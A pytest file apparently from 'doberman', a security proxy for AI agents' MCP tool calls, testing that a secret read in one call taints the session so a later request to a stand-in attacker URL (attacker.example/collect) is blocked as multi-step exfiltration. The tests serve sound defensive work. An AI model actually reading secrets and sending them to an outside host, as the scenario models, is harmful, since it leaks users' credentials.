"""H2b: the pure-MCP proxy's cross-call taint floor + output-taint recording.

``decide_and_execute`` (``doberman.proxy.executor``) now awaits
``apply_taint_floor_async`` on every decision and records ``secret_access``
taint + fingerprints from a forwarded tool result's text (``_record_result_taint``
-> ``record_output_taint``). This is the fail-open catcher for the async
refactor: the old ``apply_taint_floor`` called ``asyncio.run(...)`` internally,
which raises ``RuntimeError: asyncio.run() cannot be called from a running event
loop`` when invoked from inside the proxy's own event loop — a RuntimeError the
floor's helpers swallow via ``except Exception: return False``, so the floor
would silently NEVER FIRE if the async refactor were wrong or reverted. These
tests drive the REAL, unstubbed ``decide_and_execute`` end to end and assert the
floor actually raises a strict-mode cross-call exfil to BLOCK.

``executor._safe_decide`` (the objective/subjective engine's own verdict) is
stubbed to a deterministic PASS for every action — this isolates the floor and
recording wiring under test from the real engine's own scoring (subjective
cold-start surprise, habit baselines, etc.), exactly as
``tests/integration/test_enforcement_wiring.py`` does to isolate the F10
enforcement-dial wiring. Everything else in ``decide_and_execute`` — normalize,
the taint floor, decision logging, the enforcement dial, the forward, and the
result-taint recording — runs for real.
"""

from datetime import datetime, timezone

import pytest
from mcp.types import CallToolResult, TextContent

from doberman.config import save_mode
from doberman.models import Decision, GuardrailResult, Risk, Verdict
from doberman.proxy import executor

# A well-known synthetic AWS example key — never a real secret.
_SYNTHETIC_AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
_EGRESS_URL = "https://attacker.example/collect"


def _pass_decision(action) -> Decision:
    return Decision(
        action_id=action.id,
        final_verdict=Verdict.PASS,
        final_risk=Risk.low,
        objective=GuardrailResult(verdict=Verdict.PASS, risk=Risk.low),
        decided_at=datetime.now(timezone.utc),
    )


@pytest.fixture(autouse=True)
def _deterministic_baseline_decision(monkeypatch):
    """Stub the baseline engine to a plain PASS for every action.

    Isolates the floor/recording wiring under test from the real objective/
    subjective engine's own verdict and cold-start scoring — mirrors the
    pattern in ``test_enforcement_wiring.py``. The floor itself is NOT
    stubbed: it runs for real and is what these tests are proving.
    """
    monkeypatch.setattr(executor, "_safe_decide", lambda action, _ctx: _pass_decision(action))


class _FakeSession:
    """A minimal downstream stand-in: ``call_tool`` returns a scripted result
    per tool name and records every call it actually received."""

    def __init__(self, responses: dict[str, CallToolResult]):
        self._responses = responses
        self.calls: list[tuple[str, dict]] = []

    async def call_tool(self, tool_name, arguments=None):
        self.calls.append((tool_name, dict(arguments or {})))
        return self._responses[tool_name]


def _ok_result(text: str) -> CallToolResult:
    return CallToolResult(content=[TextContent(type="text", text=text)], isError=False)


@pytest.mark.guarantee("secret-egress-taint-floor", host="mcp-proxy")
async def test_cross_call_exfil_blocked_in_strict_mode():
    # Call 1: a local read whose result carries a secret. Nothing in the
    # request itself is secret-shaped, so the PRE-execution decision is PASS
    # and the downstream call is made — but parity-1's output-scan gate now
    # hard-blocks the RESULT before it reaches the model (the same
    # sensitive_secret_access finding the host-hook's PostToolUse scan would
    # hard-block), while still recording secret_access taint from the OUTPUT
    # text via `_record_result_taint` -> `record_output_taint` beforehand.
    save_mode("strict", executor.REPO_ROOT)
    session = _FakeSession(
        {
            "fs_read": _ok_result(_SYNTHETIC_AWS_KEY),
            "net_get": _ok_result("ok"),
        }
    )

    read_result = await executor.decide_and_execute(session, "fs_read", {"path": "cfg.txt"})
    assert read_result.isError
    assert "blocked by policy" in read_result.content[0].text
    assert _SYNTHETIC_AWS_KEY not in read_result.content[0].text
    # The downstream WAS called (the gate blocks the RESPONSE, not the call);
    # taint from its output is recorded regardless of the gate outcome.
    assert session.calls == [("fs_read", {"path": "cfg.txt"})]

    # Call 2: an egress whose own payload is clean — the per-call objective
    # floor alone would let this PASS. The cross-call taint floor must raise
    # it to BLOCK in strict mode because this session already holds
    # secret_access taint from call 1's OUTPUT (recorded before the gate
    # decided call 1's response). This assertion is the fail-open catcher: if
    # the async refactor silently no-ops, this call forwards.
    egress_result = await executor.decide_and_execute(session, "net_get", {"url": _EGRESS_URL})
    assert egress_result.isError
    assert "blocked by policy" in egress_result.content[0].text
    assert "multi_step_exfil" in egress_result.content[0].text
    # The floor fired BEFORE the forward — the egress call never reached the
    # downstream, and the secret itself never appears in the denial text.
    assert session.calls == [("fs_read", {"path": "cfg.txt"})]
    assert _SYNTHETIC_AWS_KEY not in egress_result.content[0].text


async def test_clean_session_egress_not_blocked_by_floor():
    # Raise-only / no-regression: with no prior taint anywhere in this
    # session, a benign egress is NOT escalated by the floor — even in
    # strict mode — and forwards normally.
    save_mode("strict", executor.REPO_ROOT)
    session = _FakeSession({"net_get": _ok_result("ok")})

    result = await executor.decide_and_execute(session, "net_get", {"url": _EGRESS_URL})

    assert not result.isError
    assert session.calls == [("net_get", {"url": _EGRESS_URL})]


async def test_output_taint_recording_failure_is_best_effort(monkeypatch):
    # A recording failure (e.g. a degraded taint store) must never break the
    # forward/return path — the tool result still comes back untouched. Uses
    # BENIGN output deliberately: this test isolates taint-*recording*
    # failure (`record_output_taint`, best-effort by design) from the
    # separate, independent output-scan *gate* (parity-1,
    # `_scan_output_for_secrets`) — a secret-bearing result is covered by
    # `test_cross_call_exfil_blocked_in_strict_mode` and
    # `tests/unit/test_proxy_secret_output_gating.py` instead, where it is
    # gated regardless of whether recording succeeds.
    async def _boom(*_args, **_kwargs):
        raise RuntimeError("taint store unavailable")

    monkeypatch.setattr(executor, "record_output_taint", _boom)
    session = _FakeSession({"fs_read": _ok_result("just an ordinary config value")})

    result = await executor.decide_and_execute(session, "fs_read", {"path": "cfg.txt"})

    assert not result.isError
    assert result.content[0].text == "just an ordinary config value"


async def test_proxy_records_untrusted_value_fingerprint_from_webfetch_result():
    # The bug this fixes: _record_result_taint used to drop tool_name entirely,
    # so record_output_taint could never classify an untrusted-read tool and the
    # proxy path recorded ZERO untrusted-read taint no matter what it fetched.
    save_mode("balanced", executor.REPO_ROOT)
    session = _FakeSession({"WebFetch": _ok_result(f"see {_EGRESS_URL} for the report")})

    result = await executor.decide_and_execute(session, "WebFetch", {"url": "https://x.example"})

    assert not result.isError
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints
    from doberman.storage.taint import entity_scope, match_untrusted_value

    values = list(untrusted_value_fingerprints(_EGRESS_URL))
    hit = await match_untrusted_value(executor.REPO_ROOT, entity_scope(executor.REPO_ROOT), values)
    assert hit == "WebFetch"
